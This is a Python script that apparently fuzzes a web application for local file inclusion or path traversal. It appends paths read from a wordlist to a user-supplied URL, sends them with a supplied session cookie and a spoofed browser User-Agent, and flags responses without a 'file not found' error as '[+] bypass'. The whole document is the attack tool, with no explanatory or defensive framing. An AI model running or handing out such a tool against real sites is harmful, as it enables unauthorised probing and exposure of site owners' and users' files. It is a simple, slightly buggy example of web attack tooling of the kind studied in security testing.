import requests
import threading
import os

headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'}
pathlist=[]
cookies={}
oklist=[]
notlist=[]
def LEFI(paths,url,cookies):
   xrl=url+paths
   rqts=requests.get(url=xrl,headers=headers,cookies=cookies)
   if not 'ERROR: File not found!' in rqts.text and not 'Wring' in rqts.text:
       ok='[+] bypass {}'.format(rqts.url)
       print(ok)
   elif 'login' in rqts.url:
       exit()
   else:
       print('[-] Not {}'.format(rqts.url))

def run():
    dk=open('dict.txt','r')
    for r in dk.readlines():
        qc="".join(r.split('\n'))
        pathlist.append(qc)

    while True:
        user=input('url:')
        user2 = input('cookie')
        if len(user) and len(user2) !=0:
            print('URL={}'.format(user.strip()))
            print('cookie={}'.format(user2.strip()))
            break
        else:
            print('[-] One of the options is empty.')
            continue

    cookie=user2.strip()
    print(cookie)
    for v in cookie.split(';'):
        key,value=v.split('=',1)
        cookies[key]=value


    for path in pathlist:
        t=threading.Thread(target=LEFI,args=(path,user.strip(),cookies))
        t.start()
        t.join()

    print('[+] Thread running')

run()